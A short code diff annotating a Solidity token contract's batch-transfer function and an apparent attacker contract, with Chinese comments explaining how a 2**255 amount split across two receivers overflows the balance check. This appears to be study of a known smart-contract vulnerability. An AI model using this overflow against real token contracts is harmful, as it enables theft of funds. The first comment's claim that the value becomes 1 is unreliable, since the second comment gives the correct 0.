@@ -124,7 +124,7 @@ contract amountOut {
         returns (bool)
     {
         uint256 cnt = _receivers.length;
-        uint256 value = uint256(cnt) * amount;
+        uint256 value = uint256(cnt) * amount;//如果amount=2**255 而且cnt=2时 value=1
 
         require(cnt > 0 && cnt <= 20,"too long length");
         require(amount > 0 && balances[msg.sender] >= value,"balance or amount");
@@ -172,7 +172,7 @@ contract att
     function a2() public 
     {
         arr.push(address(this));
-        arr.push(msg.sender);
+        arr.push(msg.sender);//两个地址不能相同 否则value值就是2**255+2**255=0
     }
     function a3() public 
     {
